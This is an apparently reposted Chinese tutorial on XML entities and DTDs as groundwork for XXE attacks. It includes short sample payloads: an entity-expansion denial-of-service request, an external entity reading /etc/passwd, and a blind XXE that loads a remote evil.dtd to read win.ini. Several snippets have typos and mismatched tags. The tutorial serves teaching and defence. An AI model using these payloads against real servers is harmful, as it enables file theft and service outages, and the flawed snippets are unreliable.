# XXE 相关基础概念

> 原文：[https://www.zhihuifly.com/t/topic/3585](https://www.zhihuifly.com/t/topic/3585)

## XXE 相关基础概念

**XML&DTD**

XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据

DTD(文档类型定义，[Document](http://www.liuhaihua.cn/archives/tag/document) Type Definition )的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。

**实体ENTITY**

XML中的实体类型，一般有下面几种：字符实体，命名实体（或内部实体）、外部实体（包含分为：外部普通实体、外部参数实体）。除外部参数实体外，其他实体都以字符（&）开始以字符（；）结束。

**DTD引用方式**

a)DTD 内部声明

```
<!ENTITY 实体名称 SYSTEM "URI/URL" 
```

b)DTD 外部引用

```
<!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI"> 
```

c)引用公共DTD

```
<!DOCTYPE 根元素名称 PUBLIC “DTD标识名" “公用DTD的URI"> 
```

**0x1:字符实体**

字符实体类似html的实体编码，形如a(十进制)或者a（十六进制）。

**0x2:命名实体（内部实体）**

内部实体又叫命名实体。命名实体可以说成是变量声明，命名实体只能生命在DTD或者XML文件开始部分（<!DOCTYPE>语句中）。

命名实体（或内部实体语法）:

```
<!ENTITY 实体名称 "实体的值"> 
```

如：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
    <!ENTITY x "First Param!">
    <!ENTITY y "Second Param!">
]>
<root><x>&x;</x><y>&y;</y></root> 
```

说明：

定义一个实体名称x 值为First Param!

&x; 引用实体x

知道以上语法后，可以使用名为foo的数据类型定义（DTD）构造如下请求:

request:

```
POST http://example.com/xml HTTP/1.1 `<!DOCTYPE foo [

<!ELEMENT foo ANY>

<!ENTITY bar “World”>

]>

<foo>

Hello &bar;

</foo>` 
```

respone:

```
HTTP/1.0 200 OK `Hello World` 
```

bar元素是单词“World”的别名 。看起来这样的内部实体似乎无害，但攻击者可以使用XML实体通过在实体内的实体内嵌入实体来导致拒绝服务攻击。通常被称为“ （Billion Laughs attack）[十亿笑攻击](https://en.wikipedia.org/wiki/Billion_laughs) ”。某些XML解析器会自动限制它们可以使用的内存量。

如：

request:

```
POST http://example.com/xml HTTP/1.1 `<!DOCTYPE foo [

<!ELEMENT foo ANY>

<!ENTITY bar "World ">

<!ENTITY t1 “&bar;&bar;”>

<!ENTITY t2 “&t1;&t1;&t1;&t1;”>

<!ENTITY t3 “&t2;&t2;&t2;&t2;&t2;”>

]>

<foo>

Hello &t3;

</foo>` 
```

response:

```
HTTP/1.0 200 OK `Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World` 
```

0x3):外部**普通实体**

外部实体用于加载外部文件的内容。(显示XXE攻击主要利用普通实体)

外部普通实体语法：

```
<!ENTITY 实体名称 SYSTEM "URI/URL" 
```

如：

```
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</xxe>
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPe root [
    <!ENTITY outfile SYSTEM "outfile.xml">
]>
<root><outfile>&outfile;</outfile></root> 
```

0x4):外部**参数实体**

```
<!ENTITY % 实体名称 "实体的值">
or
<!ENTITY % 实体名称 SYSTEM "URI"> 
```

参数实体用于DTD和文档的内部子集中。与一般实体不同，是以字符（%）开始，以字符(;)结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。(Blind XXE攻击常利用参数实体进行数据回显)

### 示例：

> 第一个例子

```
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://xxxx/evil.dtd">
%xxe;]>
<foo>&evil;</foo> 
```

外部evil.dtd中的内容。

```
<!ENTITY evil SYSTEM “file:///c:/windows/win.ini" > 
```

> 第二个例子

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
    <!ENTITY % param1 "Hello">
    <!ENTITY % param2 " ">
    <!ENTITY % param3 "World">
    <!ENTITY dtd SYSTEM "combine.dtd">
    %dtd;
]>
<root><foo>&content</foo></root> 
```

combine.dtd的内容为：

```
<!ENTITY content "%parm1;%parm2;%parm3;"> 
```

说明：

上面combine.dtd中定义了一个基本实体，引用了3个参数实体：%param1;，%param2;，%param3;。

解析后 … 中的内容为Hello World。